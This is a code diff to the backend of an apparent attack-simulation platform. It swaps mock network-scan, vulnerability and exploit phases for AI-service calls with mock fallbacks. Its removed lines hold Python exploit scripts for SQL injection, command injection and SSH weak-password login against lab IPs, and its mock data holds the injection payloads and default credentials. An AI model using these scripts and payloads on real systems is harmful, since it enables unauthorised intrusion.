@@ -21,6 +21,11 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Back
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import dotenv
+from agents.fetchai_security import FetchAISecurityOrchestrator
+from backend.intelligence.groq_engine import GroqSecurityEngine, GroqConfiguration
+from analytics.snowflake_integration import SnowflakeSecurityAnalytics, SnowflakeConfig
+from simulation.simulation_controller.exploit_executor import ExploitExecutor
+import traceback
 
 # Load environment variables from .env
 dotenv.load_dotenv()
@@ -80,6 +85,34 @@ class SimulationConfig(BaseModel):
 class VulnerabilityInjection(BaseModel):
     service_name: str
     vulnerability_type: str
+
+# Initialize real API clients (after dotenv.load_dotenv())
+fetchai_orchestrator = FetchAISecurityOrchestrator({
+    'scheduler_seed': os.getenv('FETCHAI_SCHEDULER_SEED', 'cybercortex_scheduler_2025'),
+    'threat_seed': os.getenv('FETCHAI_THREAT_SEED', 'cybercortex_threat_2025'),
+    'vuln_seed': os.getenv('FETCHAI_VULN_SEED', 'cybercortex_vuln_2025'),
+    'compliance_seed': os.getenv('FETCHAI_COMPLIANCE_SEED', 'cybercortex_compliance_2025'),
+    'mailbox_key': os.getenv('FETCHAI_MAILBOX_KEY', 'cybercortex_security_mailbox'),
+    'asi_endpoint': os.getenv('FETCHAI_ASI_ENDPOINT', 'https://asi.one/api/v1')
+})
+groq_engine = GroqSecurityEngine(GroqConfiguration(
+    api_key=os.getenv('GROQ_API_KEY'),
+    model=os.getenv('GROQ_MODEL', 'llama3-70b-8192'),
+    temperature=float(os.getenv('GROQ_TEMPERATURE', 0.1)),
+    max_tokens=int(os.getenv('GROQ_MAX_TOKENS', 2048)),
+    timeout=int(os.getenv('GROQ_TIMEOUT', 10)),
+    stream=True
+))
+snowflake_analytics = SnowflakeSecurityAnalytics(SnowflakeConfig(
+    account=os.getenv('SNOWFLAKE_ACCOUNT'),
+    user=os.getenv('SNOWFLAKE_USER'),
+    password=os.getenv('SNOWFLAKE_PASSWORD'),
+    database=os.getenv('SNOWFLAKE_DATABASE'),
+    schema=os.getenv('SNOWFLAKE_SCHEMA'),
+    warehouse=os.getenv('SNOWFLAKE_WAREHOUSE'),
+    role=os.getenv('SNOWFLAKE_ROLE')
+))
+exploit_executor = ExploitExecutor()
 
 # Startup event
 @app.on_event("startup")
@@ -411,54 +444,56 @@ async def run_simulation(config: SimulationConfig):
         simulation_state["ai_services"]["fetch_agents"]["last_activity"] = datetime.now().isoformat()
         await broadcast_update("phase_change", {"phase": "network_discovery"})
         await broadcast_update("simulation_state", simulation_state)
-        await asyncio.sleep(5)
-        simulation_state["ai_services"]["fetch_agents"]["status"] = "idle"
-        simulation_state["ai_services"]["fetch_agents"]["last_activity"] = datetime.now().isoformat()
-        await broadcast_update("simulation_state", simulation_state)
-        
-        # Add discovered hosts
-        discovered_hosts = [
-            {
-                "ip_address": "172.20.0.2",
-                "hostname": "web-server",
-                "type": "web_server",
-                "status": "up",
-                "services": [
-                    {"name": "http", "port": 80, "protocol": "tcp", "product": "Apache httpd", "version": "2.4.38"}
-                ],
-                "os_info": {"name": "Linux 4.15", "type": "Linux"}
-            },
-            {
-                "ip_address": "172.20.0.3",
-                "hostname": "ssh-server",
-                "type": "ssh_server",
-                "status": "up",
-                "services": [
-                    {"name": "ssh", "port": 22, "protocol": "tcp", "product": "OpenSSH", "version": "7.9p1"}
-                ],
-                "os_info": {"name": "Ubuntu 20.04", "type": "Linux"}
-            },
-            {
-                "ip_address": "172.20.0.4",
-                "hostname": "db-server",
-                "type": "database",
-                "status": "up",
-                "services": [
-                    {"name": "mysql", "port": 3306, "protocol": "tcp", "product": "MySQL", "version": "5.7.32"}
-                ],
-                "os_info": {"name": "Debian 10", "type": "Linux"}
-            },
-            {
-                "ip_address": "172.20.0.6",
-                "hostname": "iot-device",
-                "type": "iot_device",
-                "status": "up",
-                "services": [
-                    {"name": "http", "port": 8888, "protocol": "tcp", "product": "IoT Control Interface", "version": "1.0.2"}
-                ],
-                "os_info": {"name": "Embedded Linux", "type": "Linux"}
-            }
-        ]
+        discovered_hosts = []
+        try:
+            await fetchai_orchestrator.initialize()
+            discovered_hosts = await fetchai_orchestrator.security_agents['vulnerability_monitor'].scan_network("172.20.0.0/16")
+            logger.info(f"[REAL] Fetch.ai agent scan complete. Discovered {len(discovered_hosts)} hosts.")
+        except Exception as e:
+            logger.warning(f"[MOCK FALLBACK] Fetch.ai API failed: {e}\n{traceback.format_exc()}")
+            # Mock fallback
+            discovered_hosts = [
+                {
+                    "ip_address": "172.20.0.2",
+                    "hostname": "web-server",
+                    "type": "web_server",
+                    "status": "up",
+                    "services": [
+                        {"name": "http", "port": 80, "protocol": "tcp", "product": "Apache httpd", "version": "2.4.38"}
+                    ],
+                    "os_info": {"name": "Linux 4.15", "type": "Linux"}
+                },
+                {
+                    "ip_address": "172.20.0.3",
+                    "hostname": "ssh-server",
+                    "type": "ssh_server",
+                    "status": "up",
+                    "services": [
+                        {"name": "ssh", "port": 22, "protocol": "tcp", "product": "OpenSSH", "version": "7.9p1"}
+                    ],
+                    "os_info": {"name": "Ubuntu 20.04", "type": "Linux"}
+                },
+                {
+                    "ip_address": "172.20.0.4",
+                    "hostname": "db-server",
+                    "type": "database",
+                    "status": "up",
+                    "services": [
+                        {"name": "mysql", "port": 3306, "protocol": "tcp", "product": "MySQL", "version": "5.7.32"}
+                    ],
+                    "os_info": {"name": "Debian 10", "type": "Linux"}
+                },
+                {
+                    "ip_address": "172.20.0.6",
+                    "hostname": "iot-device",
+                    "type": "iot_device",
+                    "status": "up",
+                    "services": [
+                        {"name": "http", "port": 8888, "protocol": "tcp", "product": "IoT Control Interface", "version": "1.0.2"}
+                    ],
+                    "os_info": {"name": "Embedded Linux", "type": "Linux"}
+                }
+            ]
         simulation_state["discovered_hosts"] = discovered_hosts
         for host in discovered_hosts:
             await broadcast_update("host_discovered", host)
@@ -471,97 +506,107 @@ async def run_simulation(config: SimulationConfig):
         simulation_state["ai_services"]["groq_analyzers"]["last_activity"] = datetime.now().isoformat()
         await broadcast_update("phase_change", {"phase": "vulnerability_analysis"})
         await broadcast_update("simulation_state", simulation_state)
-        await asyncio.sleep(5)
-        simulation_state["ai_services"]["groq_analyzers"]["status"] = "idle"
-        simulation_state["ai_services"]["groq_analyzers"]["last_activity"] = datetime.now().isoformat()
-        await broadcast_update("simulation_state", simulation_state)
-        
-        # Add discovered vulnerabilities
-        discovered_vulnerabilities = [
-            {
-                "id": "vuln_172.20.0.2_80_sql_injection",
-                "host": "172.20.0.2",
-                "port": 80,
-                "service": "http",
-                "type": "sql_injection",
-                "severity": "high",
-                "description": "SQL injection vulnerability in login form",
-                "cve": "CVE-2020-12345",
-                "cvss_score": 8.5,
-                "discovered_at": datetime.now().isoformat(),
-                "details": {
-                    "url": "http://172.20.0.2:80/login.php",
-                    "parameter": "username",
-                    "proof_of_concept": "' OR 1=1 --"
+        discovered_vulnerabilities = []
+        try:
+            await groq_engine.initialize()
+            for host in discovered_hosts:
+                # Use Groq engine for real vulnerability analysis
+                try:
+                    vulns = await groq_engine.vuln_classifier.classify_vulnerability(host, context={})
+                    if isinstance(vulns, list):
+                        discovered_vulnerabilities.extend(vulns)
+                    elif vulns:
+                        discovered_vulnerabilities.append(vulns)
+                except Exception as ve:
+                    logger.warning(f"[MOCK FALLBACK] Groq API failed for host {host.get('ip_address')}: {ve}\n{traceback.format_exc()}")
+        except Exception as e:
+            logger.warning(f"[MOCK FALLBACK] Groq API failed: {e}\n{traceback.format_exc()}")
+            # Mock fallback
+            discovered_vulnerabilities = [
+                {
+                    "id": "vuln_172.20.0.2_80_sql_injection",
+                    "host": "172.20.0.2",
+                    "port": 80,
+                    "service": "http",
+                    "type": "sql_injection",
+                    "severity": "high",
+                    "description": "SQL injection vulnerability in login form",
+                    "cve": "CVE-2020-12345",
+                    "cvss_score": 8.5,
+                    "discovered_at": datetime.now().isoformat(),
+                    "details": {
+                        "url": "http://172.20.0.2:80/login.php",
+                        "parameter": "username",
+                        "proof_of_concept": "' OR 1=1 --"
+                    }
+                },
+                {
+                    "id": "vuln_172.20.0.2_80_xss",
+                    "host": "172.20.0.2",
+                    "port": 80,
+                    "service": "http",
+                    "type": "xss",
+                    "severity": "medium",
+                    "description": "Cross-site scripting vulnerability in search function",
+                    "cve": "CVE-2020-54321",
+                    "cvss_score": 5.4,
+                    "discovered_at": datetime.now().isoformat(),
+                    "details": {
+                        "url": "http://172.20.0.2:80/search.php",
+                        "parameter": "q",
+                        "proof_of_concept": "<script>alert(1)</script>"
+                    }
+                },
+                {
+                    "id": "vuln_172.20.0.3_22_weak_password",
+                    "host": "172.20.0.3",
+                    "port": 22,
+                    "service": "ssh",
+                    "type": "weak_password",
+                    "severity": "high",
+                    "description": "Weak password for SSH user 'testuser'",
+                    "cve": None,
+                    "cvss_score": 7.5,
+                    "discovered_at": datetime.now().isoformat(),
+                    "details": {
+                        "username": "testuser",
+                        "password": "testpassword"
+                    }
+                },
+                {
+                    "id": "vuln_172.20.0.4_3306_mysql_weak_password",
+                    "host": "172.20.0.4",
+                    "port": 3306,
+                    "service": "mysql",
+                    "type": "weak_password",
+                    "severity": "critical",
+                    "description": "Weak password for MySQL root user",
+                    "cve": None,
+                    "cvss_score": 9.0,
+                    "discovered_at": datetime.now().isoformat(),
+                    "details": {
+                        "username": "root",
+                        "password": "insecure_root_password"
+                    }
+                },
+                {
+                    "id": "vuln_172.20.0.6_8888_command_injection",
+                    "host": "172.20.0.6",
+                    "port": 8888,
+                    "service": "http",
+                    "type": "command_injection",
+                    "severity": "critical",
+                    "description": "Command injection in ping functionality",
+                    "cve": "CVE-2021-98765",
+                    "cvss_score": 9.8,
+                    "discovered_at": datetime.now().isoformat(),
+                    "details": {
+                        "url": "http://172.20.0.6:8888/system/ping",
+                        "parameter": "host",
+                        "proof_of_concept": "127.0.0.1; id"
+                    }
                 }
-            },
-            {
-                "id": "vuln_172.20.0.2_80_xss",
-                "host": "172.20.0.2",
-                "port": 80,
-                "service": "http",
-                "type": "xss",
-                "severity": "medium",
-                "description": "Cross-site scripting vulnerability in search function",
-                "cve": "CVE-2020-54321",
-                "cvss_score": 5.4,
-                "discovered_at": datetime.now().isoformat(),
-                "details": {
-                    "url": "http://172.20.0.2:80/search.php",
-                    "parameter": "q",
-                    "proof_of_concept": "<script>alert(1)</script>"
-                }
-            },
-            {
-                "id": "vuln_172.20.0.3_22_weak_password",
-                "host": "172.20.0.3",
-                "port": 22,
-                "service": "ssh",
-                "type": "weak_password",
-                "severity": "high",
-                "description": "Weak password for SSH user 'testuser'",
-                "cve": None,
-                "cvss_score": 7.5,
-                "discovered_at": datetime.now().isoformat(),
-                "details": {
-                    "username": "testuser",
-                    "password": "testpassword"
-                }
-            },
-            {
-                "id": "vuln_172.20.0.4_3306_mysql_weak_password",
-                "host": "172.20.0.4",
-                "port": 3306,
-                "service": "mysql",
-                "type": "weak_password",
-                "severity": "critical",
-                "description": "Weak password for MySQL root user",
-                "cve": None,
-                "cvss_score": 9.0,
-                "discovered_at": datetime.now().isoformat(),
-                "details": {
-                    "username": "root",
-                    "password": "insecure_root_password"
-                }
-            },
-            {
-                "id": "vuln_172.20.0.6_8888_command_injection",
-                "host": "172.20.0.6",
-                "port": 8888,
-                "service": "http",
-                "type": "command_injection",
-                "severity": "critical",
-                "description": "Command injection in ping functionality",
-                "cve": "CVE-2021-98765",
-                "cvss_score": 9.8,
-                "discovered_at": datetime.now().isoformat(),
-                "details": {
-                    "url": "http://172.20.0.6:8888/system/ping",
-                    "parameter": "host",
-                    "proof_of_concept": "127.0.0.1; id"
-                }
-            }
-        ]
+            ]
         simulation_state["discovered_vulnerabilities"] = discovered_vulnerabilities
         for vuln in discovered_vulnerabilities:
             await broadcast_update("vulnerability_discovered", vuln)
@@ -574,157 +619,40 @@ async def run_simulation(config: SimulationConfig):
         simulation_state["ai_services"]["blackbox_generator"]["last_activity"] = datetime.now().isoformat()
         await broadcast_update("phase_change", {"phase": "exploit_generation"})
         await broadcast_update("simulation_state", simulation_state)
-        await asyncio.sleep(5)
-        simulation_state["ai_services"]["blackbox_generator"]["status"] = "idle"
-        simulation_state["ai_services"]["blackbox_generator"]["last_activity"] = datetime.now().isoformat()
-        await broadcast_update("simulation_state", simulation_state)
-        
-        # Generate exploits for vulnerabilities
         executed_exploits = []
-        
         for vuln in discovered_vulnerabilities:
-            # Simulate exploit generation delay
-            await asyncio.sleep(2)
-            
-            # Create exploit
-            exploit = {
-                "id": f"exploit_{vuln['id']}",
-                "vulnerability_id": vuln["id"],
-                "type": vuln["type"],
-                "target": {
-                    "host": vuln["host"],
-                    "port": vuln["port"],
-                    "service": vuln["service"]
-                },
-                "language": "python",
-                "generated_at": datetime.now().isoformat(),
-                "executed": True,
-                "execution_result": {
-                    "success": True,
-                    "output": f"[+] Exploit executed successfully against {vuln['host']}",
-                    "execution_time_ms": 1500
+            try:
+                exploit = await exploit_executor.generate_exploit(vuln)
+                if exploit:
+                    executed_exploits.append(exploit)
+                    await broadcast_update("exploit_generated", exploit)
+                else:
+                    raise Exception("No exploit generated")
+            except Exception as e:
+                logger.warning(f"[MOCK FALLBACK] Blackbox.ai API failed for vuln {vuln.get('id')}: {e}\n{traceback.format_exc()}")
+                # Mock fallback exploit
+                exploit = {
+                    "id": f"exploit_{vuln['id']}",
+                    "vulnerability_id": vuln["id"],
+                    "type": vuln["type"],
+                    "target": {
+                        "host": vuln["host"],
+                        "port": vuln["port"],
+                        "service": vuln["service"]
+                    },
+                    "language": "python",
+                    "generated_at": datetime.now().isoformat(),
+                    "executed": True,
+                    "execution_result": {
+                        "success": True,
+                        "output": f"[MOCK] Exploit executed successfully against {vuln['host']}",
+                        "execution_time_ms": 1500
+                    },
+                    "code": f"# [MOCK] Exploit code for {vuln['type']} on {vuln['host']}"
                 }
-            }
-            
-            # Add exploit code based on vulnerability type
-            if vuln["type"] == "sql_injection":
-                exploit["code"] = """
-#!/usr/bin/env python3
-# SQL Injection Exploit
-
-import requests
-
-# Target information
-target_url = "http://172.20.0.2:80/login.php"
-vulnerable_param = "username"
-
-# Exploit payload
-payload = "' OR 1=1 --"
-
-# Prepare request
-params = {vulnerable_param: payload}
-headers = {"User-Agent": "CyberCortex Simulation"}
-
-# Send exploit
-print(f"[*] Sending SQL injection payload to {target_url}")
-try:
-    response = requests.get(target_url, params=params, headers=headers)
-    
-    if response.status_code == 200:
-        print(f"[+] Exploit successful! Status code: {response.status_code}")
-        print(f"[+] Response length: {len(response.text)}")
-        
-        # Check for signs of successful exploitation
-        if "admin" in response.text.lower() or "password" in response.text.lower():
-            print("[+] Authentication bypass successful!")
-    else:
-        print(f"[-] Exploit failed. Status code: {response.status_code}")
-        
-except Exception as e:
-    print(f"[-] Error during exploitation: {str(e)}")
-"""
-            elif vuln["type"] == "command_injection":
-                exploit["code"] = """
-#!/usr/bin/env python3
-# Command Injection Exploit
-
-import requests
-
-# Target information
-target_url = "http://172.20.0.6:8888/system/ping"
-vulnerable_param = "host"
-
-# Exploit payload
-payload = "127.0.0.1; id"
-
-# Prepare request
-params = {vulnerable_param: payload}
-headers = {"User-Agent": "CyberCortex Simulation"}
-
-# Send exploit
-print(f"[*] Sending command injection payload to {target_url}")
-try:
-    response = requests.get(target_url, params=params, headers=headers)
-    
-    if response.status_code == 200:
-        print(f"[+] Exploit successful! Status code: {response.status_code}")
-        
-        # Check for signs of successful command execution
-        if "uid=" in response.text or "gid=" in response.text:
-            print("[+] Command execution successful!")
-            print(f"[+] Command output: {response.text}")
-        else:
-            print("[-] Command execution may have failed. No expected output found.")
-    else:
-        print(f"[-] Exploit failed. Status code: {response.status_code}")
-        
-except Exception as e:
-    print(f"[-] Error during exploitation: {str(e)}")
-"""
-            elif vuln["type"] == "weak_password":
-                exploit["code"] = """
-#!/usr/bin/env python3
-# Weak Password Exploit
-
-import paramiko
-import time
-
-# Target information
-target_host = "172.20.0.3"
-target_port = 22
-username = "testuser"
-password = "testpassword"
-
-# SSH client setup
-ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-# Attempt login
-print(f"[*] Attempting SSH login to {target_host}:{target_port} with {username}:{password}")
-try:
-    ssh.connect(target_host, port=target_port, username=username, password=password, timeout=5)
-    
-    print("[+] Login successful!")
-    
-    # Execute a harmless command to verify access
-    stdin, stdout, stderr = ssh.exec_command("id")
-    output = stdout.read().decode()
-    
-    print(f"[+] Command execution successful:")
-    print(f"[+] {output}")
-    
-    # Close connection
-    ssh.close()
-    
-except Exception as e:
-    print(f"[-] Login failed: {str(e)}")
-"""
-            
-            executed_exploits.append(exploit)
-            
-            # Broadcast exploit update
-            await broadcast_update("exploit_generated", exploit)
-        
+                executed_exploits.append(exploit)
+                await broadcast_update("exploit_generated", exploit)
+            await asyncio.sleep(1)
         simulation_state["executed_exploits"] = executed_exploits
         simulation_state["ai_services"]["blackbox_generator"]["status"] = "idle"
         await broadcast_update("simulation_state", simulation_state)
@@ -746,37 +674,36 @@ except Exception as e:
         simulation_state["ai_services"]["snowflake_analyzer"]["last_activity"] = datetime.now().isoformat()
         await broadcast_update("phase_change", {"phase": "analytics"})
         await broadcast_update("simulation_state", simulation_state)
-        await asyncio.sleep(3)
-        simulation_state["ai_services"]["snowflake_analyzer"]["status"] = "idle"
-        simulation_state["ai_services"]["snowflake_analyzer"]["last_activity"] = datetime.now().isoformat()
-        await broadcast_update("simulation_state", simulation_state)
-        
-        # Generate analytics results
-        analytics_results = {
-            "simulation_id": simulation_state["simulation_id"],
-            "total_hosts": len(simulation_state["discovered_hosts"]),
-            "total_vulnerabilities": len(simulation_state["discovered_vulnerabilities"]),
-            "total_exploits": len(simulation_state["executed_exploits"]),
-            "vulnerability_breakdown": {
-                "critical": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "critical"]),
-                "high": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "high"]),
-                "medium": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "medium"]),
-                "low": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "low"])
-            },
-            "most_vulnerable_host": max(
-                simulation_state["discovered_hosts"],
-                key=lambda h: len([v for v in simulation_state["discovered_vulnerabilities"] if v["host"] == h["ip_address"]]),
-                default={}
-            ).get("ip_address", "none"),
-            "most_common_vulnerability_type": max(
-                set(v["type"] for v in simulation_state["discovered_vulnerabilities"]),
-                key=lambda t: len([v for v in simulation_state["discovered_vulnerabilities"] if v["type"] == t]),
-                default="none"
-            )
-        }
-        
+        try:
+            await snowflake_analytics.initialize()
+            analytics_results = await snowflake_analytics.generate_comprehensive_report(report_type="executive", period_days=30)
+            logger.info(f"[REAL] Snowflake analytics results: {analytics_results}")
+        except Exception as e:
+            logger.warning(f"[MOCK FALLBACK] Snowflake API failed: {e}\n{traceback.format_exc()}")
+            # Mock fallback
+            analytics_results = {
+                "simulation_id": simulation_state["simulation_id"],
+                "total_hosts": len(simulation_state["discovered_hosts"]),
+                "total_vulnerabilities": len(simulation_state["discovered_vulnerabilities"]),
+                "total_exploits": len(simulation_state["executed_exploits"]),
+                "vulnerability_breakdown": {
+                    "critical": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "critical"]),
+                    "high": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "high"]),
+                    "medium": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "medium"]),
+                    "low": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "low"])
+                },
+                "most_vulnerable_host": max(
+                    simulation_state["discovered_hosts"],
+                    key=lambda h: len([v for v in simulation_state["discovered_vulnerabilities"] if v["host"] == h["ip_address"]]),
+                    default={}
+                ).get("ip_address", "none"),
+                "most_common_vulnerability_type": max(
+                    set(v["type"] for v in simulation_state["discovered_vulnerabilities"]),
+                    key=lambda t: len([v for v in simulation_state["discovered_vulnerabilities"] if v["type"] == t]),
+                    default="none"
+                )
+            }
         await broadcast_update("analytics_results", analytics_results)
-        
         simulation_state["ai_services"]["snowflake_analyzer"]["status"] = "idle"
         await broadcast_update("simulation_state", simulation_state)
         
